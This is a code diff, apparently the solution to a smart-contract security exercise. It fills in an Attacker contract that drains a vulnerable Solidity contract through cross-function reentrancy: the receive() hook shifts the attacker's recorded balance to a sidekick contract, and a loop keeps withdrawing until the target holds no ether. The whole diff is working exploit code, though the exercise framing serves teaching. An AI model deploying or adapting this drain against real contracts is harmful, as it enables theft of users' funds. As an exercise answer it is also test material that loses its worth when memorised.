@@ -6,6 +6,7 @@ interface IVulnerable {
     function withdraw() external;
     function deposit() external payable;
 	function transferTo(address _recipient, uint _amount) external;
+    function userBalance(address _user) external returns (uint256);
 }
 
 interface ISidekick {
@@ -27,13 +28,18 @@ contract Attacker {
 	}
 
     receive() external payable {
+        target.transferTo(address(sidekick), target.userBalance(address(this)));
         /*
             Your code goes here!
         */
     }
 
     function exploit() public payable {
-        
+        if(target.userBalance(address(this)) == 0) target.deposit{value: 1 ether}();
+        target.withdraw();
+        while(address(target).balance > 0){
+            sidekick.exploit();
+        }
         /*
             Your code goes here!
         */
